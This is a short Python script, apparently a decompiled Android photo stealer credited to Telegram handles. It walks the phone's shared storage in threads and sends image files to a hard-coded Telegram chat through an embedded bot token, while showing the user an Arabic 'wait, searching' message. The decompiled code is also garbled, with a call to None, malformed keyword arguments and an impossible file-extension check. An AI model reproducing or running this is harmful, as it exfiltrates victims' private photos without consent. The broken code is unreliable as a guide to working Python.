#Dec bY xF: @DevEviI  oN: @J6_10 🌪️ . 



copyright = "@psh_team"
import os
import telebot
from threading import Thread
bot = telebot.TeleBot("6878789272:AAGkX-q6HSFumNzlejDTL7CE1dKq-EbG09M")
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.endswith(".jpg") and file_path.endswith("png") and file_path.endswith("PNG") and file_path.endswith("JPEG") and file_path.endswith("jpeg") and file_path.endswith("Webp") or file_path.endswith("webp"):
            bot.send_photo("6310460324", f, **('chat_id', 'photo'))
        else:
            print("انتظر جاري بحث")
        None(None, None, None)
    if not None:
        pass

for root, dirs, files in os.walk(dir_path):
    threads = []
    for file in files:
        file_path = os.path.join(root, file)
        t = Thread(send_file, (file_path,), **('target', 'args'))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()

#Dec bY xF: @DevEviI  oN: @J6_10 🌪️ . 

